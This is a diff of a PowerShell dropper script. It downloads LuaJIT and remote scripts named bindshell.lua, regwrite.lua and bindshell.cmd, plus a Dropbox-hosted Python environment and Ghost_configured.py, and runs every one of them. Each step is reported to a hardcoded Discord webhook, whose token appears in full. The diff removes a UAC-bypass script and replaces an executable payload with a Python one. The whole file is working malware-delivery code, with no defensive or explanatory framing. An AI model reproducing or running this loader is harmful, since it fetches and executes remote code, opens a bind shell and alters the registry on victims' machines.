@@ -4,16 +4,17 @@ $luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
 $luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
 $luaJitZip = "$baseDir\LuaJIT-2.1.zip"
 $luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
-$passUACScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/passUAC.lua"
 $bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
 $regwriteScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
 $bindshellCmdUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.cmd"
-$ghostConfigExeUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/Ghost_configured.exe"
-$passUACScriptPath = "$baseDir\passUAC.lua"
+$pythonEnvZipUrl = "https://www.dropbox.com/scl/fi/6ghhk00dw3zalvia56prb/env.zip?rlkey=n5qj3jwp18jj0jiw31r7vtcrd&st=80f4xypt&dl=1"
+$ghostConfigPyUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/Ghost_configured.py"
 $bindshellScriptPath = "$baseDir\bindshell.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
 $bindshellCmdPath = "$baseDir\bindshell.cmd"
-$ghostConfigExePath = "$baseDir\Ghost_configured.exe"
+$pythonEnvZipPath = "$baseDir\python-env.zip"
+$ghostConfigPyPath = "$baseDir\Ghost_configured.py"
+$pythonEnvPath = "$baseDir\env"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 $luaJitPath = "$baseDir\LuaJIT-2.1"
 $luaPathDir = "$baseDir\Luapath"
@@ -72,7 +73,7 @@ function Get-File {
 # Function to wait for a minute
 function Wait-ForMinute {
     Send-DiscordMessage -message "Waiting for 10 seconds before next step..."
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 5
 }
 
 # Function to copy files with wait and notification
@@ -125,32 +126,45 @@ function Get-And-Extract-LuaJIT {
         }
 
         # Confirm build by checking for luajit.exe
-        Wait-ForFile -FilePath "$luaJitPath\LuaJIT-2.1\src\luajit.exe"
+        Wait-ForFile -FilePath "$luaJitPath\src\luajit.exe"
         Wait-ForMinute
     } else {
-        $message = "LuaJIT executable already exists: $luaJitPath\LuaJIT-2.1\src\luajit.exe"
+        $message = "LuaJIT executable already exists: $luaJitPath\src\luajit.exe"
         Send-DiscordMessage -message $message
     }
 }
 
-# Function to download, wait, and execute the Ghost_configured.exe
+# Function to download, wait, and execute Ghost_configured.py with python.exe
 function Get-Execute-GhostConfig {
-    if (-not (Test-Path $ghostConfigExePath)) {
-        $message = "Getting Ghost_configured.exe..."
+    if (-not (Test-Path $ghostConfigPyPath)) {
+        $message = "Getting Ghost_configured.py..."
         Send-DiscordMessage -message $message
-        Get-File -url $ghostConfigExeUrl -destination $ghostConfigExePath
+        Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
+        Wait-ForMinute
+    }
+
+    if (-not (Test-Path "$pythonEnvPath\env\python.exe")) {
+        $message = "Getting Python environment ZIP file..."
+        Send-DiscordMessage -message $message
+        Get-File -url $pythonEnvZipUrl -destination $pythonEnvZipPath
         Wait-ForMinute
 
-        $message = "Executing Ghost_configured.exe..."
+        $message = "Extracting Python environment ZIP file..."
         Send-DiscordMessage -message $message
-        Start-Process -FilePath $ghostConfigExePath -NoNewWindow -Wait
-        $message = "Execution of Ghost_configured.exe completed."
+        Expand-Archive -Path $pythonEnvZipPath -DestinationPath $pythonEnvPath
+        Wait-ForFile -FilePath "$pythonEnvPath\env\python.exe"
+        Send-DiscordMessage -message "Extraction of Python environment completed."
+    }
+
+    if (Test-Path "$pythonEnvPath\env\python.exe") {
+        $message = "Executing Ghost_configured.py with python.exe..."
+        Send-DiscordMessage -message $message
+        Start-Process -FilePath "$pythonEnvPath\env\python.exe" -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
+        $message = "Execution of Ghost_configured.py completed."
         Send-DiscordMessage -message $message
     } else {
-        $message = "Ghost_configured.exe already exists but still downloads and executes: $ghostConfigExePath"
+        $message = "Python environment setup failed, python.exe not found."
         Send-DiscordMessage -message $message
-        Start-Process -FilePath $ghostConfigExePath -NoNewWindow -Wait
-        Wait-ForMinute
     }
 }
 
@@ -210,29 +224,29 @@ if (-not (Test-Path -Path $jitDir)) {
 }
 
 # Copy LuaJIT JIT files
-$jitSourceDir = "$luaJitPath\LuaJIT-2.1\src\jit"
+$jitSourceDir = "$luaJitPath\src\jit"
 if (Test-Path -Path $jitSourceDir) {
     Copy-File -Source "$jitSourceDir\*" -Destination $jitDir
     Wait-ForMinute
 } else {
-    $message = "JIT source directory does not exist: $jitSourceDir\LuaJIT-2.1"
+    $message = "JIT source directory does not exist: $jitSourceDir"
     Send-DiscordMessage -message $message
     exit 1
 }
 
 # Copy luajit.exe and lua51.dll to Luapath base directory
-if (Test-Path -Path "$luaJitPath\LuaJIT-2.1\src\luajit.exe") {
-    Copy-File -Source "$luaJitPath\LuaJIT-2.1\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
+if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
+    Copy-File -Source "$luaJitPath\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
 } else {
-    $message = "luajit.exe does not exist in the source directory: $luaJitPath\LuaJIT-2.1\src"
+    $message = "luajit.exe does not exist in the source directory: $luaJitPath\src"
     Send-DiscordMessage -message $message
     exit 1
 }
 
-if (Test-Path -Path "$luaJitPath\LuaJIT-2.1\src\lua51.dll") {
-    Copy-File -Source "$luaJitPath\LuaJIT-2.1\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
+if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
+    Copy-File -Source "$luaJitPath\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
 } else {
-    $message = "lua51.dll does not exist in the source directory: $luaJitPath\LuaJIT-2.1\src"
+    $message = "lua51.dll does not exist in the source directory: $luaJitPath\src"
     Send-DiscordMessage -message $message
     exit 1
 }
@@ -241,7 +255,6 @@ Wait-ForMinute
 
 # Download Lua scripts and cmd file
 $scriptUrls = @{
-    "passUAC.lua" = $passUACScriptUrl
     "bindshell.lua" = $bindshellScriptUrl
     "regwrite.lua" = $regwriteScriptUrl
     "bindshell.cmd" = $bindshellCmdUrl
@@ -263,7 +276,6 @@ foreach ($script in $scriptUrls.Keys) {
 try {
     Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$regwriteScriptPath" -NoNewWindow -Wait
     Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$bindshellScriptPath" -NoNewWindow -Wait
-    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$passUACScriptPath" -NoNewWindow -Wait
     Start-Process -FilePath "$bindshellCmdPath" -NoNewWindow -Wait
     $message = "Lua scripts and cmd file executed successfully."
     Send-DiscordMessage -message $message
@@ -274,4 +286,5 @@ try {
     pause
 }
 
+# Download and execute Ghost_configured.py with Python
 Get-Execute-GhostConfig
